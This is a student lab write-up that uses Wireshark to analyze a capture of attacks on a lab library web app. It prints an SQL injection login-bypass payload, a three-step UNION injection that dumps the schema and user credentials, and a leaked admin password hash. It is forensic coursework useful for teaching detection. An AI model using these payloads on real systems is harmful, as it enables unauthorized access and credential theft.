# Wireshark: PCAP Traffic Analysis

> **Group 11**  
> - I Ketut Weda Adikusuma - `5027251061`  
> - Sebastian Elroi Hasian Panjaitan - `5027251040`  
>
> **Course:** Keamanan Jaringan Komputer (KJK)  
> **Topic:** PCAP Forensics & Traffic Analysis (`e52ftt.pcapng`)

---

## Scenario Context

You work in a library, and in the library there are two public computers with access to a Library Management System to find which books are available. One day you decide to view the packet capture logs to find anything strange that happened in the system.

### Environment & Network Overview

| Parameter | Details | Description |
| :--- | :--- | :--- |
| **Web Server IP & Port** | `192.168.223.129:4167` | Library Management System web server |
| **Public Computer 1** | `192.168.223.130` | Public terminal used for general access |
| **Public Computer 2 (Attacker)** | `192.168.223.1` | Public workstation where anomalous & malicious traffic originated |
| **Protocol** | Unencrypted HTTP | REST API communicating via plain JSON |
| **Backend Architecture** | Express.js + SQLite | Node.js backend with SQLite relational database |

---

## Analysis & Solutions

### 1. What is the IP and Port of the web server? (8 poin)

- **Server IP:** `192.168.223.129`
- **Server Port:** `4167`

#### Explanation:
Inspecting the incoming and outgoing traffic directed towards the web service reveals that the destination IP address handling web requests (such as `GET /books` or `POST /api/login`) is `192.168.223.129` on TCP destination port `4167`.

![HTTP Traffic Overview](<Images/1.png>)

Inspection of the TCP layer in Frame `1103` explicitly confirms the destination IP and port:
- **IPv4 Destination:** `192.168.223.129`
- **TCP Destination Port:** `4167`

![Destination Port Detail](<Images/1,1.png>)

---

### 2. To help with viewing the server packets going in and out, what's a good filter to use and why? (8 poin)

- **Recommended Filter:** `http`  
  *(Alternative targeted filters: `http.request.method` or `tcp.port == 4167`)*

#### Explanation:
The Library Management System operates over unencrypted HTTP. Using the `http` display filter filters out unrelated network background noise such as broadcast/multicast packets, ARP requests, and raw TCP three-way handshakes/ACKs. This isolates the high-level application layer requests (`GET`, `POST`, `DELETE`) and responses, allowing investigators to easily read plaintext HTTP headers, endpoints, and JSON bodies.

![Wireshark Filter Application](<Images/1.png>)

---

### 3. Which user logged in on Sep 19, 2025 23:17:44 (GMT+7)? (12 poin)

- **Username:** `alice_brown`

#### Explanation:
At `23:17:44 GMT+7` (which corresponds to `16:17:44 GMT`), Frame `207` recorded an HTTP `POST` request to `/api/login` originating from public computer `192.168.223.130` to the server `192.168.223.129:4167`. 

```json
{"username":"alice_brown","password":"secret"}
```

The server accepted the credentials and responded with an HTTP `200 OK` (TCP Stream 10), confirming a successful login with user ID 5:

```json
{"success":true,"user":{"id":5,"username":"alice_brown","role":"user"}}
```

![Alice Brown Login Packet](<Images/3,1.png>)
![Login Follow Stream](<Images/3.png>)

---

### 4. What time did one of the public computers got access to admin user? (10 poin) [FLAG]

- **Timestamp:** `Fri, 19 Sep 2025 16:20:52 GMT` / `Sep 19, 2025 23:20:52 (GMT+7)`

#### Explanation:
In Frame `816` (`23:20:52.235 GMT+7`), an attacker sent a malicious login payload. Immediately following at `23:20:52.237 GMT+7` (`Date: Fri, 19 Sep 2025 16:20:52 GMT`), the server responded in Frame `818` with `HTTP/1.1 200 OK`:

```json
{"success":true,"user":{"id":1,"username":"admin","role":"admin"}}
```

This response confirms that the attacker was granted full administrative access.

---

### 5. Which IP accessed the admin user? (10 poin)

- **IP Address:** `192.168.223.1` (Source Port: `49254`)

#### Explanation:
The packet that executed the successful bypass and logged into the administrator account originated from client workstation IP `192.168.223.1` over ephemeral port `49254` directed at the server `192.168.223.129:4167`.

---

### 6. How did the attacker gain access to the admin user? (15 poin)

- **Vulnerability:** SQL Injection (SQLi) Authentication Bypass
- **Target Endpoint:** `POST /api/login`
- **Injected Payload:**
  ```json
  {"username":"' or 1=1--","password":"a"}
  ```

#### Explanation:
The backend server constructed its SQL query using insecure string concatenation or interpolation without parameterized queries:
```sql
SELECT * FROM users WHERE username = '' or 1=1--' AND password = '...';
```
1. The injected condition `' or 1=1` forces the `WHERE` clause to always evaluate to `TRUE`.
2. The sequence `--` comments out the remainder of the SQL query, bypassing the password verification entirely.
3. SQLite returns the first matching record in the `users` table, which is the administrator account (`id: 1, username: "admin", role: "admin"`).
4. The server treated the query result as a valid authenticated session and issued an administrative session/response to the attacker.

---

### 7. What book did the attacker delete? (8 poin)

- **Book Title:** **1984**
- **Author:** **George Orwell**
- **Book ID:** `3` (ISBN: `978-0-452-28423-4`)

#### Explanation:
In Frame `875`, public workstation `192.168.223.1` issued an HTTP `DELETE` request:
```http
DELETE /api/books/3 HTTP/1.1
Host: 192.168.223.129:4167
```
The server responded with:
```json
{"success":true,"deleted":1}
```

A comparison of the search results before deletion (Stream 31 at `16:20:53 GMT`) and after deletion (Stream 35 at `16:21:11 GMT`) demonstrates that book ID 3 (*1984* by George Orwell) was removed from the database:

![HTTP Request Methods Filter](<Images/Pasted image (2).png>)
![Book Deletion Comparison](<Images/Pasted image.png>)

---

### 8. The attacker added a new book to the database, what was it called? (8 poin)

- **Book Title:** **"please fix your server"**
- **Author:** `love, W.`
- **Book ID Created:** `22`
- **Details:** `ISBN: 41`, `Year: 6767`, `Description: "come on"`

#### Explanation:
In Frame `1011` (`23:22:40 GMT+7`), the attacker submitted an HTTP `POST` request to `/api/books` using their admin session (`userId: 1`):

```json
{
  "title": "please fix your server",
  "author": "love, W.",
  "isbn": "41",
  "year": 6767,
  "description": "come on",
  "userId": 1
}
```

The server acknowledged creation in Frame `1013` with `{"success":true,"id":22}`. Subsequent searches confirmed that ID 22 (`"please fix your server"`) had been written into the catalog.

*(Note: "Animal Farm" with ID 13 was an existing book already present in the catalog prior to the incident, not added by the attacker).*

---

### 9. How did the attacker successfully leak all the usernames and passwords? (15 poin)

- **Attack Technique:** 3-step UNION-based SQL Injection via the search query parameter: `GET /api/search?q=`

#### Attack Stages:

1. **Step 1: Column Enumeration Probe (Frame 908)**
   ```http
   GET /api/search?q=%27%20union%20select%201%2C2%2C3%2C4%2C5%2C6-- HTTP/1.1
   ```
   - **Decoded:** `' union select 1,2,3,4,5,6--`
   - **Purpose:** Test whether the search query parameter was vulnerable to SQL injection and determine the exact number of columns returned (6 columns).

2. **Step 2: Database Schema Extraction (Frame 921)**
   ```http
   GET /api/search?q=%27%20union%20select%20sql%2C2%2C3%2C4%2C5%2C6%20from%20sqlite_master-- HTTP/1.1
   ```
   - **Decoded:** `' union select sql,2,3,4,5,6 from sqlite_master--`
   - **Purpose:** Query the SQLite internal master table `sqlite_master` to retrieve database schema definitions. This revealed the table structures:
     - `CREATE TABLE books (id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT, author TEXT, isbn TEXT, year INTEGER, description TEXT)`
     - `CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT, role TEXT DEFAULT 'user')`

3. **Step 3: User Credential Exfiltration (Frame 932)**
   ```http
   GET /api/search?q=%27%20union%20select%20username%2Cpassword%2C3%2C4%2C5%2C6%20from%20users-- HTTP/1.1
   ```
   - **Decoded:** `' union select username,password,3,4,5,6 from users--`
   - **Purpose:** Map the `username` and `password` columns from the `users` table into the `id` and `title` fields of the book search JSON response, leaking the complete list of users and password hashes.

![SQL Injection GET Requests](<Images/Pasted image (4).png>)
![SQL Injection Exploitation Steps](<Images/Pasted image (3).png>)

---

### 10. What was the password hash of admin account? (6 poin)

- **Admin Password Hash:** `0192023a7bbd73250516f069df18b500`

#### Explanation:
In the exfiltrated dataset returned by Frame `934` (resulting from the UNION injection in Frame `932`), the `admin` row was extracted as:

```json
{
  "id": "admin",
  "title": "0192023a7bbd73250516f069df18b500",
  "author": 3,
  "isbn": 4,
  "year": 5,
  "description": 6
}
```

- **Username (`id`):** `admin`
- **Password Hash (`title`):** `0192023a7bbd73250516f069df18b500` *(MD5 hash)*

![Admin Password Hash Exfiltration](<Images/Pasted image (5).png>)

---
